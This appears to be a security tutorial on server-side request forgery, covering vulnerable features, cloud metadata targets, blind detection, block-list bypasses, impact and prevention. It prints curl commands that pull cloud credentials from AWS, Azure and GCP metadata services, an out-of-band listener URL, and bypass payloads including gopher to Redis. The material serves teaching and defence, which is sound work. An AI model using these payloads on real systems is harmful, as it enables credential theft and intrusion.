Server-Side Request Forgery (SSRF)

2026-10-15 · 9 min read

Server-Side Request Forgery (SSRF) turns a web application into a proxy for the attacker. You supply a URL; the server fetches it. Because that request now originates from inside the network, it reaches things you never could from the outside — cloud metadata services, internal admin panels, databases, and anything that trusts "internal" traffic. In cloud environments SSRF is often the single step between a web bug and full account takeover.

Where it hides

Any feature that fetches a URL on your behalf is a candidate: webhooks, link previews, PDF and thumbnail generators, "import from URL", document converters, avatar-by-URL, and SSO/OpenID discovery. The tell is a parameter that holds a URL or hostname:

POST /api/pdf/render        {"url":"https://report.corp/x"}
GET  /fetch?url=https://example.com/image.png
POST /webhook   {"callback":"https://hooks.me/x"}

If the destination comes from input and the server does not restrict where it may connect, you control the server's outbound request.

The prize: cloud metadata

Internal services skip authentication because they assume only trusted callers can reach them — SSRF breaks that assumption. The highest-value target is the link-local instance metadata service (IMDS) on 169.254.169.254, which hands out the instance's credentials. The exact request differs per provider:

# AWS IMDSv1 (no token) — one request returns role creds
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"

# AWS IMDSv2 needs a PUT first — harder to reach via a GET-only SSRF
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Azure (header required) and GCP (header required)
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

Recovered role credentials feed straight into the Cloud Attack Path Explorer and AWS Attack Paths.

Blind vs. non-blind

If the fetched response is reflected back to you, SSRF is non-blind and you read internal content directly. If nothing comes back, it is blind: confirm it out-of-band by pointing the server at a listener you control, and exploit it through side effects.

# confirm blind SSRF with an OOB listener (Burp Collaborator / your own host)
?url=http://YOUR-COLLABORATOR-ID.oast.site/     # a DNS+HTTP hit confirms the fetch

Why block-lists fail

Naive defences string-match localhost or 169.254.169.254. These fall to alternate encodings and redirects, which is why a block-list is the wrong control:

http://127.0.0.1        http://127.1          http://0            http://[::1]
http://2130706433/      # decimal 127.0.0.1   http://0x7f.0x0.0x0.0x1
http://169.254.169.254.nip.io/      # DNS name that resolves to the target
http://allowed-host/redirect?to=http://169.254.169.254/   # 302 to the real target
gopher://127.0.0.1:6379/_<redis-protocol>   # reach non-HTTP services

Impact

Target reachedResult
Cloud metadata (169.254.169.254)Role/SA credentials → cloud account access
Internal admin panel / dashboardUnauthenticated management access
Internal API or databaseData access, further pivot
localhost / gopher to a daemonDebug endpoints, actuators, Redis/other unauth services

Prevention

  • Allow-list, don't block-list. Resolve the hostname, check the resulting IP against an explicit allow-list, and re-validate after every redirect (so a 302 to an internal IP is caught).
  • Block link-local and private ranges at egress and run fetchers in a segment with no route to metadata or admin.
  • Enforce IMDSv2 so a simple GET-only SSRF cannot read credentials.
  • Disable unused schemes (file://, gopher://, dict://) and cap response size and redirect count.
  • Detect outbound requests from app servers to link-local or internal addresses — they should essentially never happen.
